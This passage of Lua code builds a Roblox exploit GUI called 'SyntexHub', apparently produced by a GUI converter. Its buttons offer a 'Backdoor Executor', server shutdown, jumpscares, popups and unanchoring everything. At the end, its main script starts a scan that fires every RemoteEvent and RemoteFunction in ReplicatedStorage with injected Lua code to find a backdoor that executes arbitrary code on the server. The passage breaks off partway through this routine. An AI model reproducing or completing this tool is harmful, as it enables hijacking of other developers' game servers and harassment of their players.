-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Sound.LocalScript
G2L["4e"] = Instance.new("LocalScript", G2L["4b"]);



-- StarterGui.SyntexHub.SriptHub.ID
G2L["4f"] = Instance.new("TextBox", G2L["25"]);
G2L["4f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["PlaceholderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["TextWrapped"] = true;
G2L["4f"]["TextSize"] = 14;
G2L["4f"]["Name"] = [[ID]];
G2L["4f"]["TextScaled"] = true;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4f"]["ClearTextOnFocus"] = false;
G2L["4f"]["PlaceholderText"] = [[Set ID (Decal/Music) ...]];
G2L["4f"]["Size"] = UDim2.new(0, 230, 0, 39);
G2L["4f"]["Position"] = UDim2.new(0.03823, 0, 0.82699, 0);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Text"] = [[]];
G2L["4f"]["BackgroundTransparency"] = 1;


-- StarterGui.SyntexHub.SriptHub.ID.UIStroke
G2L["50"] = Instance.new("UIStroke", G2L["4f"]);
G2L["50"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["50"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ID.UICorner
G2L["51"] = Instance.new("UICorner", G2L["4f"]);



-- StarterGui.SyntexHub.SriptHub.ID.BuoyancySensor
G2L["52"] = Instance.new("BuoyancySensor", G2L["4f"]);



-- StarterGui.SyntexHub.SriptHub.ssB
G2L["53"] = Instance.new("TextButton", G2L["25"]);
G2L["53"]["TextWrapped"] = true;
G2L["53"]["TextSize"] = 25;
G2L["53"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["TextScaled"] = true;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["53"]["Size"] = UDim2.new(0, 73, 0, 38);
G2L["53"]["BackgroundTransparency"] = 1;
G2L["53"]["Name"] = [[ssB]];
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 41, 9);
G2L["53"]["Text"] = [[Backdoor Executor]];
G2L["53"]["Position"] = UDim2.new(0.05846, -11, 0.05214, 0);


-- StarterGui.SyntexHub.SriptHub.ssB.UICorner
G2L["54"] = Instance.new("UICorner", G2L["53"]);



-- StarterGui.SyntexHub.SriptHub.ssB.UIStroke
G2L["55"] = Instance.new("UIStroke", G2L["53"]);
G2L["55"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["55"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ssB.LocalScript
G2L["56"] = Instance.new("LocalScript", G2L["53"]);



-- StarterGui.SyntexHub.SriptHub.txt
G2L["57"] = Instance.new("TextBox", G2L["25"]);
G2L["57"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["PlaceholderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["TextWrapped"] = true;
G2L["57"]["TextSize"] = 14;
G2L["57"]["Name"] = [[txt]];
G2L["57"]["TextScaled"] = true;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["57"]["ClearTextOnFocus"] = false;
G2L["57"]["PlaceholderText"] = [[Set Message/Hint Text ...]];
G2L["57"]["Size"] = UDim2.new(0, 217, 0, 39);
G2L["57"]["Position"] = UDim2.new(0.53722, 0, 0.82699, 0);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[]];
G2L["57"]["BackgroundTransparency"] = 1;


-- StarterGui.SyntexHub.SriptHub.txt.UIStroke
G2L["58"] = Instance.new("UIStroke", G2L["57"]);
G2L["58"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["58"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.txt.UICorner
G2L["59"] = Instance.new("UICorner", G2L["57"]);



-- StarterGui.SyntexHub.SriptHub.txt.BuoyancySensor
G2L["5a"] = Instance.new("BuoyancySensor", G2L["57"]);



-- StarterGui.SyntexHub.SriptHub.p2
G2L["5b"] = Instance.new("TextButton", G2L["25"]);
G2L["5b"]["TextWrapped"] = true;
G2L["5b"]["TextSize"] = 25;
G2L["5b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["TextScaled"] = true;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["5b"]["Size"] = UDim2.new(0, 73, 0, 38);
G2L["5b"]["BackgroundTransparency"] = 1;
G2L["5b"]["Name"] = [[p2]];
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 41, 9);
G2L["5b"]["Text"] = [[P2]];
G2L["5b"]["Position"] = UDim2.new(0.83915, -11, 0.05214, 0);


-- StarterGui.SyntexHub.SriptHub.p2.UICorner
G2L["5c"] = Instance.new("UICorner", G2L["5b"]);



-- StarterGui.SyntexHub.SriptHub.p2.UIStroke
G2L["5d"] = Instance.new("UIStroke", G2L["5b"]);
G2L["5d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5d"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.p2.LocalScript
G2L["5e"] = Instance.new("LocalScript", G2L["5b"]);



-- StarterGui.SyntexHub.sh2
G2L["5f"] = Instance.new("Frame", G2L["1"]);
G2L["5f"]["Visible"] = false;
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["Size"] = UDim2.new(0, 497, 0, 289);
G2L["5f"]["Position"] = UDim2.new(0.08115, 0, 0.04253, 0);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Name"] = [[sh2]];


-- StarterGui.SyntexHub.sh2.p1
G2L["60"] = Instance.new("TextButton", G2L["5f"]);
G2L["60"]["TextWrapped"] = true;
G2L["60"]["TextSize"] = 25;
G2L["60"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["TextScaled"] = true;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["60"]["Size"] = UDim2.new(0, 73, 0, 38);
G2L["60"]["BackgroundTransparency"] = 1;
G2L["60"]["Name"] = [[p1]];
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 41, 9);
G2L["60"]["Text"] = [[P1]];
G2L["60"]["Position"] = UDim2.new(0.05846, -11, 0.05214, 0);


-- StarterGui.SyntexHub.sh2.p1.UICorner
G2L["61"] = Instance.new("UICorner", G2L["60"]);



-- StarterGui.SyntexHub.sh2.p1.UIStroke
G2L["62"] = Instance.new("UIStroke", G2L["60"]);
G2L["62"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["62"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.p1.LocalScript
G2L["63"] = Instance.new("LocalScript", G2L["60"]);



-- StarterGui.SyntexHub.sh2.UIStroke
G2L["64"] = Instance.new("UIStroke", G2L["5f"]);
G2L["64"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["64"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.UIGradient
G2L["65"] = Instance.new("UIGradient", G2L["5f"]);



-- StarterGui.SyntexHub.sh2.UICorner
G2L["66"] = Instance.new("UICorner", G2L["5f"]);



-- StarterGui.SyntexHub.sh2.TextLabel
G2L["67"] = Instance.new("TextLabel", G2L["5f"]);
G2L["67"]["TextWrapped"] = true;
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextScaled"] = true;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["TextSize"] = 26;
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["67"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["BackgroundTransparency"] = 1;
G2L["67"]["Size"] = UDim2.new(0, 278, 0, 55);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[Script Hub p2]];
G2L["67"]["Position"] = UDim2.new(0.22666, 0, 0.02065, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame
G2L["68"] = Instance.new("ScrollingFrame", G2L["5f"]);
G2L["68"]["Active"] = true;
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(166, 166, 166);
G2L["68"]["Size"] = UDim2.new(0, 465, 0, 157);
G2L["68"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Position"] = UDim2.new(0.03823, 0, 0.23875, 0);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["BackgroundTransparency"] = 1;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.UIStroke
G2L["69"] = Instance.new("UIStroke", G2L["68"]);
G2L["69"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedHint
G2L["6a"] = Instance.new("TextButton", G2L["68"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["TextScaled"] = true;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6a"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["6a"]["BackgroundTransparency"] = 1;
G2L["6a"]["Name"] = [[AnimatedHint]];
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Text"] = [[Set Animated Hint]];
G2L["6a"]["Position"] = UDim2.new(0.03659, 0, 0.03034, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedHint.UICorner
G2L["6b"] = Instance.new("UICorner", G2L["6a"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedHint.UIStroke
G2L["6c"] = Instance.new("UIStroke", G2L["6a"]);
G2L["6c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6c"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedHint.LocalScript
G2L["6d"] = Instance.new("LocalScript", G2L["6a"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedMessage
G2L["6e"] = Instance.new("TextButton", G2L["68"]);
G2L["6e"]["TextWrapped"] = true;
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["TextSize"] = 14;
G2L["6e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["TextScaled"] = true;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6e"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["6e"]["BackgroundTransparency"] = 1;
G2L["6e"]["Name"] = [[AnimatedMessage]];
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["Text"] = [[Set Animated Message]];
G2L["6e"]["Position"] = UDim2.new(0.03659, 0, 0.15645, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedMessage.UICorner
G2L["6f"] = Instance.new("UICorner", G2L["6e"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedMessage.UIStroke
G2L["70"] = Instance.new("UIStroke", G2L["6e"]);
G2L["70"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["70"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedMessage.LocalScript
G2L["71"] = Instance.new("LocalScript", G2L["6e"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.UnAnchor
G2L["72"] = Instance.new("TextButton", G2L["68"]);
G2L["72"]["TextWrapped"] = true;
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextSize"] = 14;
G2L["72"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["TextScaled"] = true;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["72"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["72"]["BackgroundTransparency"] = 1;
G2L["72"]["Name"] = [[UnAnchor]];
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Text"] = [[UnAnchor All]];
G2L["72"]["Position"] = UDim2.new(0.03659, 0, 0.27849, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.UnAnchor.UICorner
G2L["73"] = Instance.new("UICorner", G2L["72"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.UnAnchor.UIStroke
G2L["74"] = Instance.new("UIStroke", G2L["72"]);
G2L["74"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["74"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.UnAnchor.LocalScript
G2L["75"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.popups
G2L["76"] = Instance.new("TextButton", G2L["68"]);
G2L["76"]["TextWrapped"] = true;
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["TextScaled"] = true;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["76"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["76"]["BackgroundTransparency"] = 1;
G2L["76"]["Name"] = [[popups]];
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["Text"] = [[Set Popups (Very OP)]];
G2L["76"]["Position"] = UDim2.new(0.03659, 0, 0.38834, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.popups.UICorner
G2L["77"] = Instance.new("UICorner", G2L["76"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.popups.UIStroke
G2L["78"] = Instance.new("UIStroke", G2L["76"]);
G2L["78"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["78"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.popups.LocalScript
G2L["79"] = Instance.new("LocalScript", G2L["76"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.Jumpscare
G2L["7a"] = Instance.new("TextButton", G2L["68"]);
G2L["7a"]["TextWrapped"] = true;
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["TextScaled"] = true;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7a"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["7a"]["BackgroundTransparency"] = 1;
G2L["7a"]["Name"] = [[Jumpscare]];
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Text"] = [[Set Jumpscare]];
G2L["7a"]["Position"] = UDim2.new(0.03659, 0, 0.50628, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.Jumpscare.UICorner
G2L["7b"] = Instance.new("UICorner", G2L["7a"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.Jumpscare.UIStroke
G2L["7c"] = Instance.new("UIStroke", G2L["7a"]);
G2L["7c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7c"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.Jumpscare.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7a"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.JohnDoe
G2L["7e"] = Instance.new("TextButton", G2L["68"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["TextScaled"] = true;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7e"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["7e"]["BackgroundTransparency"] = 1;
G2L["7e"]["Name"] = [[JohnDoe]];
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Text"] = [[Be John Doe (R6 ONLY)]];
G2L["7e"]["Position"] = UDim2.new(0.03659, 0, 0.62616, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.JohnDoe.UICorner
G2L["7f"] = Instance.new("UICorner", G2L["7e"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.JohnDoe.UIStroke
G2L["80"] = Instance.new("UIStroke", G2L["7e"]);
G2L["80"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["80"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.JohnDoe.LocalScript
G2L["81"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.Shutdown
G2L["82"] = Instance.new("TextButton", G2L["68"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["TextScaled"] = true;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["82"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["82"]["BackgroundTransparency"] = 1;
G2L["82"]["Name"] = [[Shutdown]];
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Text"] = [[Shutdown (Set Reason)]];
G2L["82"]["Position"] = UDim2.new(0.03659, 0, 0.75978, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.Shutdown.UICorner
G2L["83"] = Instance.new("UICorner", G2L["82"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.Shutdown.UIStroke
G2L["84"] = Instance.new("UIStroke", G2L["82"]);
G2L["84"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["84"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.Shutdown.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["82"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.RandomC
G2L["86"] = Instance.new("TextButton", G2L["68"]);
G2L["86"]["TextWrapped"] = true;
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["TextSize"] = 14;
G2L["86"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["TextScaled"] = true;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["86"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["86"]["BackgroundTransparency"] = 1;
G2L["86"]["Name"] = [[RandomC]];
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Text"] = [[Random Colors]];
G2L["86"]["Position"] = UDim2.new(0.03659, 0, 0.87448, 0);


-- StarterGui.SyntexHub.sh2.ScrollingFrame.RandomC.UICorner
G2L["87"] = Instance.new("UICorner", G2L["86"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.RandomC.UIStroke
G2L["88"] = Instance.new("UIStroke", G2L["86"]);
G2L["88"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["88"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ScrollingFrame.RandomC.LocalScript
G2L["89"] = Instance.new("LocalScript", G2L["86"]);



-- StarterGui.SyntexHub.sh2.ScrollingFrame.UICorner
G2L["8a"] = Instance.new("UICorner", G2L["68"]);
G2L["8a"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.SyntexHub.sh2.ID
G2L["8b"] = Instance.new("TextBox", G2L["5f"]);
G2L["8b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["PlaceholderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["BorderSizePixel"] = 0;
G2L["8b"]["TextWrapped"] = true;
G2L["8b"]["TextSize"] = 14;
G2L["8b"]["Name"] = [[ID]];
G2L["8b"]["TextScaled"] = true;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8b"]["ClearTextOnFocus"] = false;
G2L["8b"]["PlaceholderText"] = [[Set ID (Decal/Music) ...]];
G2L["8b"]["Size"] = UDim2.new(0, 230, 0, 39);
G2L["8b"]["Position"] = UDim2.new(0.03823, 0, 0.82699, 0);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Text"] = [[]];
G2L["8b"]["BackgroundTransparency"] = 1;


-- StarterGui.SyntexHub.sh2.ID.UIStroke
G2L["8c"] = Instance.new("UIStroke", G2L["8b"]);
G2L["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8c"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.ID.UICorner
G2L["8d"] = Instance.new("UICorner", G2L["8b"]);



-- StarterGui.SyntexHub.sh2.ID.BuoyancySensor
G2L["8e"] = Instance.new("BuoyancySensor", G2L["8b"]);



-- StarterGui.SyntexHub.sh2.txt
G2L["8f"] = Instance.new("TextBox", G2L["5f"]);
G2L["8f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["PlaceholderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["TextWrapped"] = true;
G2L["8f"]["TextSize"] = 14;
G2L["8f"]["Name"] = [[txt]];
G2L["8f"]["TextScaled"] = true;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8f"]["ClearTextOnFocus"] = false;
G2L["8f"]["PlaceholderText"] = [[Set Message/Hint Text ...]];
G2L["8f"]["Size"] = UDim2.new(0, 217, 0, 39);
G2L["8f"]["Position"] = UDim2.new(0.53722, 0, 0.82699, 0);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["Text"] = [[]];
G2L["8f"]["BackgroundTransparency"] = 1;


-- StarterGui.SyntexHub.sh2.txt.UIStroke
G2L["90"] = Instance.new("UIStroke", G2L["8f"]);
G2L["90"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["90"]["Thickness"] = 3;


-- StarterGui.SyntexHub.sh2.txt.UICorner
G2L["91"] = Instance.new("UICorner", G2L["8f"]);



-- StarterGui.SyntexHub.sh2.txt.BuoyancySensor
G2L["92"] = Instance.new("BuoyancySensor", G2L["8f"]);



-- StarterGui.SyntexHub.sh2.rainbowGradient
G2L["93"] = Instance.new("LocalScript", G2L["5f"]);
G2L["93"]["Name"] = [[rainbowGradient]];


-- StarterGui.SyntexHub.sh2.DraggableGUI
G2L["94"] = Instance.new("LocalScript", G2L["5f"]);
G2L["94"]["Name"] = [[DraggableGUI]];


-- StarterGui.SyntexHub.SS.DraggableGUI
local function C_5()
local script = G2L["5"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_5);
-- StarterGui.SyntexHub.SS.rainbowGradient
local function C_6()
local script = G2L["6"];
	local speed = 3
	while task.wait() do
		local hue = tick() % speed / speed
		local color = Color3.fromHSV(hue, 0.5, 1)
		local hue2 = (tick() + speed/(speed*2.4)) % speed / speed
		local color2 = Color3.fromHSV(hue2, 0.5, 1)
		
		for i,v in ipairs(script.Parent:GetDescendants()) do
			if v:IsA("UIGradient") then
				v.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,color),ColorSequenceKeypoint.new(1,color2)})
			end
		end
	
	end
end;
task.spawn(C_6);
-- StarterGui.SyntexHub.SS.Hide.LocalScript
local function C_e()
local script = G2L["e"];
	local img = script.Parent.Parent.hideIMG
	
	script.Parent.MouseButton1Click:Connect(function()
		img.Visible = not img.Visible
		script.Parent.Parent.source.TextTransparency = 1
		script.Parent.Parent.source.Interactable = false
		if script.Parent.Text == "Hide" then
			script.Parent.Text = "Reveal"
		else
			script.Parent.Text = "Hide"
			script.Parent.Parent.source.Interactable = true
			script.Parent.Parent.source.TextTransparency = 0
		end
	end)
end;
task.spawn(C_e);
-- StarterGui.SyntexHub.SS.ScriptHubB.LocalScript
local function C_15()
local script = G2L["15"];
	local sh = script.Parent.Parent.Parent.SriptHub
	local ss = script.Parent.Parent.Parent.SS
	
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.ScanButton.Text == "Statut : Injected" then
			ss.source.Text = ""
			ss.Visible = false
			sh.Visible = true
		else
			script.Parent.Parent.source.Text = "-- Inject before using script hub!"
			wait(2)
			script.Parent.Parent.source.Text = ""
		end
	end)
end;
task.spawn(C_15);
-- StarterGui.SyntexHub.SS.Clear.LocalScript
local function C_23()
local script = G2L["23"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.source.Text = ""
	end)
end;
task.spawn(C_23);
-- StarterGui.SyntexHub.SS.MainSystem
local function C_24()
local script = G2L["24"];
	--[[
	  Don't leak this code, or else...
	  Made By @Syntex
	]]
	
	local Cody = script.Parent.source
	local ScanButton = script.Parent.ScanButton
	local AcquiredRemote = nil 
	local IsAcquiring = false 
	local exe = script.Parent.Execute
	local StarterGui = game:GetService("StarterGui")
	
	ScanButton.MouseButton1Click:Connect(function() 
		local RemoteList = {} 
		local isFound = false
	
		if not IsAcquiring then 
			IsAcquiring = true 
			warn('Syntex Backdoor // Scan Started!') 
			Cody.Text = '-- Please wait, while we are scanning the remotes.'
	
			for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
					print('Getting ' .. v.ClassName .. ' "' .. v.Name .. '" into RemoteList.')
					table.insert(RemoteList, v) 
				end 
			end 
	
			local startTime = os.clock()
	
			local function checkRemote(b)
				if AcquiredRemote == nil then 
					print("Checking " .. b.ClassName .. ' "' .. b.Name .. '".') 
	
					local NeededNameOfModel = ""
					for i = 1, 10 do
						NeededNameOfModel = NeededNameOfModel .. string.char(math.random(0x0041, 0x005A))
					end
	
					local NeededCode = 'Instance.new("Model", workspace).Name="' .. NeededNameOfModel .. '"'
					if b:IsA('RemoteEvent') then 
						print('Fired')
						b:FireServer(NeededCode) 
					elseif b:IsA('RemoteFunction') then 
						print('Invoked')
						b:InvokeServer(NeededCode) 
					end 
	
